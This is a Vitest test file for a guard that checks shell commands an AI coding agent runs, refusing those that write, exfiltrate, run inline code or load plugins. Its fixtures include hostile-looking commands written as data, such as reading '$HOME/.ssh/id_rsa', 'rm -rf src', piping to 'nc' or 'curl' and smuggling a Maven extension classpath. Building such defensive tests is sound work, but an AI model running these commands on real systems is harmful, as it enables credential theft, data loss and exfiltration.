import { describe, expect, it } from 'vitest'
import {
  restoreRefusal,
  shellExpands,
  shellRefusal,
  shellWords,
  splitChain,
} from '../../plugins/veilio-guard/lib/shell.ts'

// Ported from spec 069 (CE feat/069-guard-core 346d167,
// packages/guard/tests/placeholder-links.test.ts): there the adapter refused or
// allowed each command; here the parser is asked directly.
describe('shellRefusal (spec 069, ported by spec 078)', () => {
  it.each([
    'git commit -m "fix __PKG__16.ts" src/__PKG__16.ts',
    'cat src/__PKG__16.ts > out.txt',
    'cat src/__PKG__16.ts >> out.txt',
    'cat src/__PKG__16.ts | tee out.txt',
    "sed -i 's/a/b/' src/__PKG__16.ts",
    'perl -pi -e s/a/b/ src/__PKG__16.ts',
    'python3 -c \'open("src/__PKG__16.ts")\'',
    'node -e x src/__PKG__16.ts',
    'find src -name __PKG__16.ts -delete',
    'find src/__PKG__16.ts -exec rm {} ;',
    'cat $(echo src/__PKG__16.ts)',
    'cd src && cat __PKG__16.ts',
    'rm src/__PKG__16.ts',
    'find src -name __PKG__16.ts -fprint out.txt',
    'find src -fls out.txt -name __PKG__16.ts',
    'rg --pre ./run x src/__PKG__16.ts',
    'rg --pre-glob "*.ts" x src/__PKG__16.ts',
    'rg -z x src/__PKG__16.ts',
    'git --output=out.txt diff src/__PKG__16.ts',
    'git diff --output=out.txt src/__PKG__16.ts',
    'git diff --ext-diff src/__PKG__16.ts',
    'git log --textconv src/__PKG__16.ts',
    'git -c diff.external=./run diff src/__PKG__16.ts',
    'cat src/__PKG__16.ts\nrm -rf src',
    'cat src/__PKG__16.ts & rm -rf src',
    '(cat src/__PKG__16.ts)',
    'cat <(cat src/__PKG__16.ts)',
    'cat <<EOF src/__PKG__16.ts',
    "rg --'pre' ./run x src/__PKG__16.ts",
    'rg "--pre=./run" x src/__PKG__16.ts',
    'rg -nz x src/__PKG__16.ts',
    'git diff --ext"-diff" src/__PKG__16.ts',
    'git diff --out\\put=o src/__PKG__16.ts',
    'find src/__PKG__16.ts "-fprint" o',
    'node --test --import ./x.mjs src/__PKG__16.ts',
    'node --test --test-reporter-destination=o src/__PKG__16.ts',
    'node --test -r ./x src/__PKG__16.ts',
    'find src/__PKG__16.ts "-exec" rm {} ;',
    'find src/__PKG__16.ts "-delete"',
    "find src/__PKG__16.ts -ok'dir' rm {} ;",
    'node --test-reporter=./x src/__PKG__16.ts',
    'node --test-reporter-destination=o --test src/__PKG__16.ts',
    'cat "src/__PKG__16.ts',
    'find src/__PKG__16.ts -exe? rm {} ;',
    'find src/__PKG__16.ts ?delete',
    'rg --pr[e] ./run x src/__PKG__16.ts',
    'git diff --ext-dif* src/__PKG__16.ts',
    "find src/__PKG__16.ts $'-delete'",
    'find src/__PKG__16.ts $X',
    'rg ${PRE} x src/__PKG__16.ts',
    'cat "$HOME/.ssh/id_rsa" src/__PKG__16.ts',
    'cat src/__PKG__16.ts keys/*',
    'cat src/__PKG__16.ts >&1out',
    'cat src/__PKG__16.ts 2>&1out',
    'rg x --hostname-bin=./run src/__PKG__16.ts',
    'rg x --hostname-bin ./run src/__PKG__16.ts',
    'rg x --hyperlink-format=file://{path} src/__PKG__16.ts',
    'grep "a|b src/__PKG__16.ts',
    // Security review of the git and MCP changes: git is not a reader.
    'grep -n class src/__PKG__16.ts && git diff src/__PKG__16.ts',
  ])('refuses %j', (command) => {
    expect(shellRefusal(command)).not.toBeNull()
  })

  it.each([
    'cat src/__PKG__16.ts | wc -l',
    'grep -n class src/__PKG__16.ts && wc -l src/__PKG__16.ts',
    'head -5 src/__PKG__16.ts; ls src',
    'node --test src/__PKG__16.ts',
    'rg -n "settle.*ok" src/__PKG__16.ts',
    "grep -n 'cost $5' src/__PKG__16.ts",
    'npx vitest run src/__PKG__16.ts 2>&1 | tail -20',
    'npx vitest run src/__PKG__16.ts 2>&1',
    'grep "a|b" src/__PKG__16.ts',
    "grep 'a && b; c' src/__PKG__16.ts",
  ])('allows %j', (command) => {
    expect(shellRefusal(command)).toBeNull()
  })

  it('splits a chain outside quotes only', () => {
    expect(splitChain('grep "a\\"|b" src/__PKG__16.ts')).toEqual(['grep "a\\"|b" src/__PKG__16.ts'])
    expect(splitChain('cat a | wc -l && ls; rg x')).toEqual(['cat a ', ' wc -l ', ' ls', ' rg x'])
    expect(splitChain('cat "a')).toBeNull()
  })

  it('reads words as the shell passes them', () => {
    expect(shellWords(`rg --'pre' "a b" c\\ d`)).toEqual(['rg', '--pre', 'a b', 'c d'])
    expect(shellWords('cat "a')).toBeNull()
  })

  it('sees an expansion outside single quotes only', () => {
    expect(shellExpands("grep 'cost $5' f")).toBe(false)
    expect(shellExpands('grep "cost $5" f')).toBe(true)
    expect(shellExpands('cat keys/*')).toBe(true)
  })
})

// Spec 078 R1: what may get real names back in Claude Code's shell tools.
describe('restoreRefusal (spec 078)', () => {
  it.each([
    'cat src/__X__1.ts',
    'cat src/__X__1.ts | head -50',
    'grep -rn __X__1 src',
    'grep -rnw __X__1 src',
    "grep 'a && b; c' src/__X__1.ts",
    'rg -n __X__1',
    'rg -tpy __X__1',
    'head -n 20 src/__X__1.ts',
    'tail -20 src/__X__1.ts',
    'npx vitest run tests/__X__1.test.ts 2>&1 | tail -20',
    'ls src/__X__1',
    'wc -l src/__X__1.ts',
  ])('lets %j through', (command) => {
    expect(restoreRefusal(command, 'Bash')).toBeNull()
  })

  it.each([
    ['grep -o x src/__X__1.ts', '`grep` `-o`'],
    ['grep -rno x src', '`grep` `-rno`'],
    ['grep --only-matching x f', '`grep` `--only-matching`'],
    ['rg -r y x f', '`rg` `-r`'],
    ['rg -o x f', '`rg` `-o`'],
    ['rg --replace=y x f', '`rg` `--replace=y`'],
    ['head -c 7 f', '`head` `-c`'],
    ['head --bytes=7 f', '`head` `--bytes=7`'],
    ['tail -c5 f', '`tail` `-c5`'],
    ['find src -printf %f', '`find` `-printf`'],
    ['find src -fprintf o %f', '`find` `-fprintf`'],
  ])('refuses the reshaping flag in %j', (command, says) => {
    expect(restoreRefusal(command, 'Bash')).toContain(says)
  })

  it.each([
    ['echo __X__1 | base64', '`echo` is not one of those'],
    ['cat f | xxd', '`xxd` is not one of those'],
    ['curl https://x/__X__1', 'off this machine'],
    ['cat f | nc x 1', 'off this machine'],
    ['git push origin __X__1', 'off this machine'],
    ['git fetch __X__1', 'off this machine'],
    ['git commit -m "__X__1"', 'git commit -F <file>'],
    ['cd __X__1', 'a cd gets no real names back'],
    ['ls && pushd __X__1', 'a cd gets no real names back'],
    ['cat f >&1out', 'cannot use'],
    ['cat f > o', 'cannot use a redirection or tee'],
    ['cat f | tee o', 'cannot use a redirection or tee'],
    ['cat f $X', 'cannot use a variable, a glob or another expansion'],
    ['cat f; (ls)', 'cannot use a subshell'],
    ['cat "f', 'cannot use quotes that do not close'],
  ])('refuses %j', (command, says) => {
    expect(restoreRefusal(command, 'Bash')).toContain(says)
  })

  // Security review of 232d48f (HIGH): the program is a whole word, never a
  // prefix of one, and an assignment or a wrapper in front is not a reader.
  it.each([
    'cat.sh __X__1',
    'ls-foo __X__1',
    'cat=x curl https://x/__X__1',
    'FOO=1 curl https://x/__X__1',
    'env curl https://x/__X__1',
    'command curl https://x/__X__1',
    'grep-x __X__1 src',
    'npx vitest.sh __X__1',
    'git diff-tree __X__1',
    'npm testx __X__1',
  ])('refuses %j: its program is not a reader', (command) => {
    expect(restoreRefusal(command, 'Bash')).not.toBeNull()
    expect(shellRefusal(command)).not.toBeNull()
  })

  it.each([
    'cat=x curl https://x/__X__1',
    'FOO=1 curl https://x/__X__1',
    'env curl https://x/__X__1',
  ])('names the network program behind %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).toContain('off this machine')
  })

  // Security review of 232d48f (MEDIUM): grouped short flags, and long
  // options abbreviated as GNU getopt accepts them.
  it.each([
    ['head -nc5 f', '`head` `-nc5`'],
    ['tail -qc5 f', '`tail` `-qc5`'],
    ['grep --only-match x f', '`grep` `--only-match`'],
    ['grep --o x f', '`grep` `--o`'],
    ['head --byt=5 f', '`head` `--byt=5`'],
    ['tail --b 5 f', '`tail` `--b`'],
    ['rg --repl=y x f', '`rg` `--repl=y`'],
    ['rg --only x f', '`rg` `--only`'],
    ['rg --pre-g x f', '`rg` `--pre-g`'],
    ['grep --color=always x f', '`grep` `--color=always`'],
    ['grep --colour=always x f', '`grep` `--colour=always`'],
    ['rg --color always x f', '`rg` `--color`'],
  ])('refuses %j', (command, says) => {
    expect(restoreRefusal(command, 'Bash')).toContain(says)
  })

  it.each([
    'grep --color=never x src/__X__1.ts',
    'rg --hidden __X__1',
    'head -n5 src/__X__1.ts',
    'mvn -q test -Dtest=__X__1',
    'python3 -m pytest tests/__X__1.py',
  ])('still lets %j through', (command) => {
    expect(restoreRefusal(command, 'Bash')).toBeNull()
  })

  // Review round 1 (T030) #2: inline code for every interpreter, and the
  // test runners' flags that run another program or load code.
  it.each([
    'ruby -Itest -e "x" tests/__X__1.rb',
    'ruby -Itest -rx tests/__X__1.rb',
    'go test -toolexec ./x ./__X__1',
    'go test -exec=./x ./__X__1',
    'cargo test --config x __X__1',
    'cargo test -Zx __X__1',
    'npm test --script-shell=./x -- __X__1',
    'npm run test --node-options=--require=./x __X__1',
    'pnpm test --script-shell ./x __X__1',
    'yarn test --x __X__1',
    'pytest -p ./plug tests/__X__1.py',
    'python3 -m pytest -pplug tests/__X__1.py',
    'mvn -DargLine=x test -Dtest=__X__1',
    'mvn -s other.xml test -Dtest=__X__1',
    'rake test -e x __X__1',
  ])('refuses the runner flag in %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).not.toBeNull()
    expect(shellRefusal(command)).not.toBeNull()
  })

  it.each([
    'perl -e x __X__1',
    'perl -E x __X__1',
    'php -r x __X__1',
    'deno eval x __X__1',
    'bun -e x __X__1',
    'lua -e x __X__1',
    'Rscript -e x __X__1',
    'ruby -e x __X__1',
  ])('refuses the inline code in %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).not.toBeNull()
    expect(shellRefusal(command)).not.toBeNull()
  })

  it.each([
    'npm test -- tests/__X__1.test.ts',
    'go test ./__X__1/...',
    'cargo test __X__1',
    'pytest tests/__X__1.py -k x',
    'mvn -q test',
    'ruby -Itest tests/__X__1.rb',
    'rake test',
  ])('a plain test run still gets real names: %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).toBeNull()
  })

  // Review round 2 #1: a test runner gets real names only when every option
  // it is given is on its own allow-list; anything else is refused with #1.
  it.each([
    'npx vitest run --config ./x.ts tests/__X__1.test.ts',
    'npx vitest run --globalSetup ./x.ts tests/__X__1.test.ts',
    'npx vitest run --reporter=./x.ts tests/__X__1.test.ts',
    'mvn --define x=y test',
    'mvn -fX test',
    'mvn -t x.xml test',
    'pytest -o x=y tests/__X__1.py',
    'pytest --override-ini=x=y tests/__X__1.py',
    'pytest --pdbcls=x:y tests/__X__1.py',
    'pytest -c x.ini tests/__X__1.py',
    'python3 -m pytest -c x.ini tests/__X__1.py',
    'go test -C other ./__X__1',
    'go test -overlay x.json ./__X__1',
    'go test -o out ./__X__1',
    'cargo test --manifest-path x/Cargo.toml __X__1',
    'cargo test __X__1 -- --nocapture',
    'npm test -- --config ./x tests/__X__1.test.ts',
    'npm test --silent tests/__X__1.test.ts',
    'node --test --watch tests/__X__1.test.mjs',
    // Security review of round 2: a value given as the next word is never an option.
    'npx vitest run -t --config /tmp/x.mjs tests/__X__1.test.ts',
    'pytest -k -p evil tests/__X__1.py',
    'go test -run -exec x ./__X__1',
    'npx vitest run tests/__X__1.test.ts -t',
  ])('refuses %j: an option not on the runner allow-list', (command) => {
    expect(restoreRefusal(command, 'Bash')).toMatch(
      /^a shell command gets real names back only when it reads files or runs tests .*is not one of those/
    )
  })

  it.each([
    'npx vitest run tests/__X__1.test.ts',
    'npx vitest run -t "pays the order" tests/__X__1.test.ts',
    'npx vitest run --testNamePattern=pays tests/__X__1.test.ts',
    'npx vitest --run tests/__X__1.test.ts',
    'pytest -k pay -x -q -v tests/__X__1.py',
    'python -m pytest -q tests/__X__1.py',
    'python3 -m unittest -v tests/__X__1.py',
    'go test -run TestPay -v -count=1 ./__X__1/...',
    'cargo test __X__1',
    'cargo test __X__1 --',
    'npm test',
    'npm test -- tests/__X__1.test.ts',
    'pnpm run test tests/__X__1.test.ts',
    'mvn -q test',
    'mvn test',
    'ruby -Itest tests/__X__1.rb',
    'rake test',
    'node --test tests/__X__1.test.mjs',
  ])('a runner given only allowed options gets real names: %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).toBeNull()
  })

  // Review round 1 (T030) #3: more flags that slice or reshape output.
  it.each([
    ['rg -p x f', '`rg` `-p`'],
    ['rg --pretty x f', '`rg` `--pretty`'],
    ['head -4c f', '`head` `-4c`'],
    ['tail -5c f', '`tail` `-5c`'],
    ['tail +3c f', '`tail` `+3c`'],
    ['tail -2b f', '`tail` `-2b`'],
  ])('refuses %j', (command, says) => {
    expect(restoreRefusal(command, 'Bash')).toContain(says)
  })

  it.each(['head -5 src/__X__1.ts', 'tail -n 3 src/__X__1.ts'])(
    'still lets %j through',
    (command) => {
      expect(restoreRefusal(command, 'Bash')).toBeNull()
    }
  )

  // Security review of the git and MCP changes: git is not a reader. Its
  // configuration can run programs no flag check sees, so a git command gets
  // no real names back, with or without a flag.
  it.each([
    'git log --oneline -- src/__X__1.ts',
    'git diff --no-color __X__1',
    'git diff --no-ext-diff __X__1',
    'git diff --stat __X__1',
    'git log --format=%s',
    'git show --pretty=format:%s',
    'git log --form=%s',
    'git show --pre=format:%s',
    'git diff --outp=o f',
    'git diff --ext f',
    'git diff --textc f',
    'git diff --color-words f',
    'git diff --word-diff f',
    'git diff --word-diff-regex=. f',
    'git diff --stat=20 f',
    'git diff --stat-name-width=5 f',
    'git status __X__1',
    'git show HEAD:src/__X__1.ts',
  ])('refuses %j: git is not a reader', (command) => {
    expect(restoreRefusal(command, 'Bash')).toBe(
      'a shell command gets real names back only when it reads files or runs tests (cat, head, tail, grep, rg, ls, find, wc, a test runner), and `git` is not one of those. Use the Edit, Write or Grep tool instead, or name the file by its full path'
    )
  })

  it('refuses every PowerShell command', () => {
    expect(restoreRefusal('Get-Content src/__X__1.ts', 'PowerShell')).toBe(
      'PowerShell commands get no real names back yet. Use the Read, Edit, Write or Grep tool'
    )
  })

  it('is never weaker than spec 069 on a command 069 refuses', () => {
    for (const command of [
      'find src -fls out.txt -name x',
      'node --test --import ./x.mjs f',
      'git -c diff.external=./run diff f',
    ])
      expect(restoreRefusal(command, 'Bash')).not.toBeNull()
  })
})

// Review round 4 (benchmark, plugin e3a7697): ordinary test runs the bench
// sessions were refused on. Fixtures are the bench's command strings, with
// its placeholders.
describe('restoreRefusal: the runners the benchmark needed (spec 078 review round 4)', () => {
  it.each([
    'mvn -q -o -f __VAR__499/pom.xml test -Dtest=__CLS__346 2>&1 | head -40',
    'mvn -q -o -f __VAR__499/pom.xml test -Dtest=__CLS__346',
    'cat /dev/null; ls ledger; mvn -q -o -f ledger/pom.xml test -Dtest=__CLS__316 2>&1 | head -30',
    'mvn -q -o -f ledger/pom.xml test -Dtest=__CLS__346 2>&1 | tail -30',
    'mvn -q -o test -Dtest=__CLS__307 2>&1',
    'mvn -B test',
    'mvn test -Dtest=__CLS__307 -DfailIfNoTests=false',
    'mvn -q test -Dtest=__CLS__307 -Dsurefire.failIfNoSpecifiedTests=false',
    'mvn -f ledger test',
    'npx vitest run --root gateway tests/__PKG__16.test.ts 2>&1 | head -40; head -30 gateway/tests/__PKG__16.test.ts',
    'npx vitest run --root gateway tests/__PKG__16.test.ts 2>&1 | tail -30',
    'npx vitest run --root=gateway tests/__PKG__16.test.ts',
    'vitest run --root gateway tests/__PKG__16.test.ts',
    'vitest run --root gateway tests/__PKG__72.test.ts 2>&1 | tail -20',
    'node_modules/.bin/vitest run --root gateway tests/__PKG__16.test.ts 2>&1 | tail -30',
    './node_modules/.bin/vitest run --root gateway tests/__PKG__16.test.ts 2>&1 | tail -30',
    'npx vitest run --reporter verbose tests/__PKG__16.test.ts',
    'npx vitest run --reporter=dot tests/__PKG__16.test.ts',
    'vitest run -t "pays the order" tests/__PKG__16.test.ts',
    // The example the cd refusal gives must itself get real names.
    'npx vitest run __DIR__1/x.test.ts',
    'npx vitest run --root gateway/ tests/__PKG__16.test.ts',
    'npx vitest run --root ./gateway tests/__PKG__16.test.ts',
    'mvn -q -o -f ledger/pom.xml test -Dtest=__CLS__1#pays+refunds',
    'npx vitest tests/__PKG__16.test.ts',
    'npx vitest run x.test.ts',
    'npx vitest run -t pays tests/__PKG__16.test.ts',
    'npx vitest run tests/ -t pays',
  ])('lets %j through', (command) => {
    expect(restoreRefusal(command, 'Bash')).toBeNull()
  })

  it.each([
    // Maven: only the test goal, and only these options.
    'mvn -s evil.xml test',
    'mvn test exec:java',
    'mvn exec:java test',
    'mvn -Dexec.x=1 test',
    'mvn -P evil test',
    'mvn -am test',
    'mvn install',
    'mvn -q -o',
    'mvn -Dtest=__CLS__1',
    'mvn test test',
    'mvn test -Dtest __CLS__1',
    'mvn test -Dtest',
    'mvn test -DfailIfNoTests=true',
    'mvn -qo test',
    'mvn -f -q test',
    'mvn -f',
    'mvn -f=pom.xml test',
    'mvn --file pom.xml test',
    'mvn -fpom.xml test',
    // A -f or --root value is a relative path inside the project, never empty.
    'cat ledger/pom.xml | mvn -f /dev/stdin test',
    'mvn -f /dev/fd/0 test',
    'mvn -f /tmp/x/pom.xml test',
    'mvn -f ../x/pom.xml test',
    'mvn -f a/../../x/pom.xml test',
    'mvn -f ~/x/pom.xml test',
    'mvn -f "" test',
    'npx vitest run --root /tmp/x',
    'npx vitest run --root ..',
    'npx vitest run --root=',
    'npx vitest run --root=/tmp/x tests/__PKG__16.test.ts',
    'npx vitest run --root gateway/../.. tests/__PKG__16.test.ts',
    'npx vitest run --root ~ tests/__PKG__16.test.ts',
    // Review round 4b #1: vitest and Maven strip inner quotes the shell left.
    `npx vitest run --root '"/tmp/x"' tests/__PKG__16.test.ts`,
    `npx vitest run --root='"/tmp/x"' tests/__PKG__16.test.ts`,
    `npx vitest run --root "'/tmp/x'" tests/__PKG__16.test.ts`,
    `npx vitest run --root '".."' tests/__PKG__16.test.ts`,
    `mvn -f '"/tmp/x/pom.xml"' test -Dtest=__CLS__1`,
    `mvn -f '"../x"' test`,
    'npx vitest run --root "my dir" tests/__PKG__16.test.ts',
    // Review round 4b #2: a vitest command other than run is not a test run.
    'vitest init browser __X__1',
    'npx vitest init browser __X__1',
    'vitest bench __X__1',
    'vitest doctor __X__1',
    'vitest list __X__1',
    'vitest watch __X__1',
    'vitest dev __X__1',
    'vitest related __X__1',
    'npx vitest typecheck __X__1',
    'npx vitest -t pays init __X__1',
    'node_modules/.bin/vitest --root gateway bench __X__1',
    // Review round 4c: a positional word is run or a test path, nothing else.
    'npx vitest frobnicate __X__1',
    'npx vitest run pays',
    'vitest __X__1',
    'npx vitest run tests/__PKG__16.test.ts pays',
    'npx vitest run tests/../../x.test.ts',
    'npx vitest run /tmp/x.test.ts',
    `npx vitest run '"/tmp/x.test.ts"'`,
    'npx vitest run "tests/a b.test.ts"',
    // Review round 4b #3: -Dtest takes a pattern only, never a second property.
    'mvn test "-Dtest=a -Dmaven.ext.class.path=/tmp/e.jar"',
    `mvn test '-Dtest="a"'`,
    'mvn -q test __X__1',
    // vitest: --config stays off, and a reporter is a built-in name only.
    'npx vitest --config x',
    'vitest run --config x.ts tests/__PKG__16.test.ts',
    'node_modules/.bin/vitest run --config x.ts tests/__PKG__16.test.ts',
    'npx vitest run --reporter ./x.ts tests/__PKG__16.test.ts',
    'npx vitest run --reporter blob tests/__PKG__16.test.ts',
    'npx vitest run --reporter html tests/__PKG__16.test.ts',
    // Built in only in some vitest versions; elsewhere the name is imported as a package.
    'npx vitest run --reporter basic tests/__PKG__16.test.ts',
    'npx vitest run --reporter agent tests/__PKG__16.test.ts',
    'npx vitest run --reporter minimal tests/__PKG__16.test.ts',
    'npx vitest run --reporter tree tests/__PKG__16.test.ts',
    'npx vitest run --root -t x tests/__PKG__16.test.ts',
    'npx vitest run tests/__PKG__16.test.ts --root',
    'npx vitest run -r gateway tests/__PKG__16.test.ts',
    '/tmp/x/node_modules/.bin/vitest run tests/__PKG__16.test.ts',
    'gateway/node_modules/.bin/vitest run tests/__PKG__16.test.ts',
    'vitest.sh run tests/__PKG__16.test.ts',
  ])('refuses %j: not on the runner allow-list', (command) => {
    expect(restoreRefusal(command, 'Bash')).toMatch(
      /^a shell command gets real names back only when it reads files or runs tests .*is not one of those/
    )
    expect(shellRefusal(command)).not.toBeNull()
  })

  // 078 decisions with their own tests; round 4 does not widen them.
  it.each([
    "sed -i 's/a/b/' planner/dwell/__VAR__842.py",
    'cd gateway && npx vitest run tests/__PKG__16.test.ts',
    'cat ledger/src/main/java/com/__VAR__528/ledger/tariff/*.java',
    'cat planner/tide/{__VAR__785,__FN__1590}.py',
  ])('still refuses %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).not.toBeNull()
  })
})
